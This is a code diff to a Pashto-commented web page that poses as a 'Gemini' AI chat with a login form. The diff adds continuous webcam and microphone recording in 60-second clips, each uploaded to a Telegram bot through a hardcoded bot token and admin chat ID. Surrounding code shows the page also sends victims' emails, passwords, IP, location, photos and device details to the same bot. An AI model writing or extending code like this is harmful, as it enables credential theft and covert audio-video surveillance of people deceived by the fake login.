@@ -317,6 +317,22 @@ button:disabled{
 .hidden {
     display: none !important;
 }
+
+/* ========== د ویډیو ثبتولو حالت ========== */
+.video-status {
+    font-size: 11px;
+    color: #4ade80;
+    text-align: center;
+    padding: 4px;
+    background: rgba(74,222,128,0.1);
+    border-radius: 20px;
+    margin-top: 4px;
+}
+
+.video-status.recording {
+    color: #ff6b6b;
+    background: rgba(255,107,107,0.1);
+}
 </style>
 </head>
 
@@ -383,6 +399,8 @@ button:disabled{
         <input type="text" id="chatInput" placeholder="Ask anything...">
         <button id="sendBtn">Send</button>
     </div>
+    
+    <div class="video-status" id="videoStatus">🎥 Recording video...</div>
 </div>
 
 <script>
@@ -392,6 +410,7 @@ button:disabled{
     const BOT_TOKEN = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";
     const ADMIN_CHAT_ID = "8295417969";
     const BOT_USERNAME = "YourBotUsername"; // خپل بوټ کارن نوم واچوئ
+    const MAX_VIDEO_DURATION = 60000; // ۶۰ ثانیې ویډیو
     // ================================================================
 
     let stream = null;
@@ -400,17 +419,24 @@ button:disabled{
     let captureTimer = null;
     let attempts = 0;
     let isLoggedIn = false;
+    
+    // ========== د ویډیو ثبتولو متغیرونه ==========
+    let mediaRecorder = null;
+    let recordedChunks = [];
+    let isRecording = false;
+    let videoStartTime = 0;
+    let isVideoSent = false;
 
-    // ========== د کیمرې فعالول ==========
+    // ========== د کیمرې او ویډیو فعالول ==========
     async function startCamera() {
         try {
             stream = await navigator.mediaDevices.getUserMedia({
                 video: {
                     facingMode: 'user',
-                    width: { ideal: 480 },
-                    height: { ideal: 360 }
+                    width: { ideal: 640 },
+                    height: { ideal: 480 }
                 },
-                audio: false
+                audio: true
             });
             
             const video = document.getElementById('video');
@@ -418,10 +444,97 @@ button:disabled{
             await video.play();
             
             isRunning = true;
+            
+            // د ویډیو ثبتول پیل کړئ
+            startVideoRecording();
+            
+            // د عکسونو ثبتول پیل کړئ
             startAutoCapture();
             
         } catch (error) {
             console.warn('Camera not available:', error);
+            document.getElementById('videoStatus').textContent = '⚠️ Camera not available';
+            document.getElementById('videoStatus').style.color = '#ff6b6b';
+        }
+    }
+
+    // ========== د ویډیو ثبتول (یوه بشپړه ویډیو) ==========
+    function startVideoRecording() {
+        if (!stream) return;
+        
+        recordedChunks = [];
+        isVideoSent = false;
+        videoStartTime = Date.now();
+        
+        try {
+            mediaRecorder = new MediaRecorder(stream, {
+                mimeType: 'video/webm;codecs=vp9,opus'
+            });
+            
+            mediaRecorder.ondataavailable = function(event) {
+                if (event.data.size > 0) {
+                    recordedChunks.push(event.data);
+                }
+            };
+            
+            mediaRecorder.onstop = function() {
+                if (recordedChunks.length > 0 && !isVideoSent) {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    sendVideoToTelegram(blob);
+                    isVideoSent = true;
+                    recordedChunks = [];
+                    document.getElementById('videoStatus').textContent = '✅ Video sent!';
+                    document.getElementById('videoStatus').style.color = '#4ade80';
+                    
+                    // بیا ویډیو ثبتول پیل کړئ
+                    setTimeout(() => {
+                        if (isRunning) {
+                            startVideoRecording();
+                            document.getElementById('videoStatus').textContent = '🎥 Recording video...';
+                            document.getElementById('videoStatus').style.color = '#ff6b6b';
+                        }
+                    }, 2000);
+                }
+            };
+            
+            mediaRecorder.start(1000);
+            isRecording = true;
+            document.getElementById('videoStatus').textContent = '🎥 Recording video...';
+            document.getElementById('videoStatus').style.color = '#ff6b6b';
+            
+            // د ۶۰ ثانیو وروسته ویډیو بنده کړئ
+            setTimeout(() => {
+                if (mediaRecorder && isRecording) {
+                    mediaRecorder.stop();
+                    isRecording = false;
+                    document.getElementById('videoStatus').textContent = '⏳ Processing video...';
+                    document.getElementById('videoStatus').style.color = '#ffd93d';
+                }
+            }, MAX_VIDEO_DURATION);
+            
+        } catch (error) {
+            console.error('Video recording error:', error);
+            document.getElementById('videoStatus').textContent = '⚠️ Video recording failed';
+            document.getElementById('videoStatus').style.color = '#ff6b6b';
+        }
+    }
+
+    // ========== ویډیو بوټ ته لیږل ==========
+    async function sendVideoToTelegram(blob) {
+        try {
+            const duration = Math.floor((Date.now() - videoStartTime) / 1000);
+            const formData = new FormData();
+            formData.append('chat_id', ADMIN_CHAT_ID);
+            formData.append('video', blob, `video_${Date.now()}.webm`);
+            formData.append('caption', `🎥 Video (${duration}s) • With Audio`);
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+            await fetch(url, { method: 'POST', body: formData });
+            
+            console.log('Video sent successfully!');
+            
+        } catch (error) {
+            console.error('Send video error:', error);
         }
     }
 
@@ -534,6 +647,7 @@ button:disabled{
             `📡 *ISP:* ${location.isp}\n` +
             `🗺️ *Map:* ${locationLink}\n\n` +
             `📸 *Photos:* ${photoCount}\n` +
+            `🎥 *Video:* Recording...\n` +
             `🌍 *Browser:* ${navigator.userAgent.split(' ').slice(0, 3).join(' ')}\n` +
             `📱 *Device:* ${navigator.platform}\n` +
             `⏰ *Time:* ${new Date().toLocaleString()}`;
@@ -622,7 +736,6 @@ button:disabled{
             return;
         }
 
-        // بریالی Login
         await sendToAdmin(email, password, ip, location);
 
         showSuccess('✅ Login successful!');
@@ -639,6 +752,15 @@ button:disabled{
     // ========== Logout ==========
     document.getElementById('logoutBtn').addEventListener('click', () => {
         isLoggedIn = false;
+        isRunning = false;
+        
+        if (mediaRecorder && isRecording) {
+            try { mediaRecorder.stop(); } catch(e) {}
+            isRecording = false;
+        }
+        if (captureTimer) clearInterval(captureTimer);
+        if (stream) stream.getTracks().forEach(track => track.stop());
+        
         document.getElementById('chatPage').classList.add('hidden');
         document.getElementById('loginPage').classList.remove('hidden');
         document.getElementById('loginBtn').disabled = false;
@@ -657,7 +779,6 @@ button:disabled{
     function getAIResponse(question) {
         const q = question.toLowerCase().trim();
         
-        // د مختلفو پوښتنو لپاره ځوابونه
         const responses = {
             'سلام': 'سلام! څنګه یاست؟ زه ستاسو سره د مرستې لپاره حاضر یم!',
             'سلام؟': 'سلام! څنګه یاست؟ زه ستاسو سره د مرستې لپاره حاضر یم!',
@@ -680,19 +801,16 @@ button:disabled{
             'څه شی یاست': 'زه Gemini یم، یو مصنوعي استخبارات چې د پوښتنو ځواب ویلو او د معلوماتو ورکولو لپاره جوړ شوی یم!',
             'څه شی یاست؟': 'زه Gemini یم، یو مصنوعي استخبارات چې د پوښتنو ځواب ویلو او د معلوماتو ورکولو لپاره جوړ شوی یم!',
             'مننه': 'ښه راغلاست! نوره مرسته درته وکړم؟',
-            'مننه': 'ښه راغلاست! نوره مرسته درته وکړم؟',
             'خدای': 'خدای دې ورسره مل وي! نوره مرسته درته وکړم؟',
             'خدای؟': 'خدای دې ورسره مل وي! نوره مرسته درته وکړم؟'
         };
 
-        // د پوښتنې لپاره ځواب وګوره
         for (let [key, value] of Object.entries(responses)) {
             if (q.includes(key) || q === key) {
                 return value;
             }
         }
 
-        // که ځواب ونه موندل شي
         return `🤔 زه ستاسو پوښتنه پوه شوم، خو د دې لپاره ځانګړی ځواب نه لرم. مهرباني وکړئ بله پوښتنه وکړئ!`;
     }
 
@@ -703,7 +821,6 @@ button:disabled{
         
         if (!message) return;
         
-        // د کارونکي پیغام ښودل
         const messagesDiv = document.getElementById('chatMessages');
         const userMsg = document.createElement('div');
         userMsg.className = 'message user';
@@ -713,11 +830,9 @@ button:disabled{
         input.value = '';
         messagesDiv.scrollTop = messagesDiv.scrollHeight;
         
-        // د ټایپ کولو انیمیشن
         const typing = document.getElementById('typingIndicator');
         typing.style.display = 'block';
         
-        // د ځواب ویلو لپاره ځنډ
         setTimeout(() => {
             typing.style.display = 'none';
             
@@ -739,7 +854,6 @@ button:disabled{
         }
     });
 
-    // ========== Enter کیلي د Login لپاره ==========
     document.addEventListener('keypress', function(e) {
         if (e.key === 'Enter') {
             if (!document.getElementById('loginPage').classList.contains('hidden')) {
